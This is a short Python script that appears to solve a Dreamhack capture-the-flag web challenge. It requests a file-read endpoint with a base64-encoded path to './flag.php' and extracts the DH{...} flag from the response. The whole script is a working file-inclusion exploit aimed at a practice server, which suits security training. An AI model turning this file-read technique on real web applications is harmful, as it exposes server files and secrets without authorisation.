import requests, re, base64

url = 'http://host3.dreamhack.games:9593'

payload = './flag.php'


res = requests.get(f'{url}?file={base64.b64encode(payload.encode('utf-8')).decode('utf-8')}')
print(re.search(r'DH\{[^>]*\}', res.text).group(0))